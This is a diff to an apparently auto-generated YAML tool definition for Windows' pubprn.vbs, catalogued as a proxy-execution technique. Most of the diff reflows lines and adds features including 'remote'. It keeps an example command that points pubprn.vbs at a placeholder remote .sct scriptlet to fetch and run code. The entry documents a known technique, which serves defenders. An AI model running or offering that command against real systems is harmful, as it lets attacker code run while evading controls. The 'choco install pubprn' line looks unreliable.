@@ -2,7 +2,8 @@
 id: windows-execution-pubprn
 namespace: windows:execution:pubprn
 name: pubprn
-description: 'Proxy execution with Pubprn.vbs Located at: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs; C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs.'
+description: 'Proxy execution with Pubprn.vbs Located at: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs;
+  C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -41,7 +42,10 @@ resource_profile:
 allowed-tools:
 - pubprn
 parameters: []
-features: []
+features:
+- pipes-stdin
+- pipes-stdout
+- remote
 execution:
   template: pubprn
   sandbox: execFile
@@ -49,7 +53,8 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection (Proxy execution)
+- description: Set the 2nd variable with a Script COM moniker to perform Windows Script
+    Host (WSH) Injection (Proxy execution)
   command: pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
 references:
 - label: ''
@@ -74,7 +79,6 @@ install:
   commands:
   - choco install pubprn
 ---
-
 
 # pubprn
 
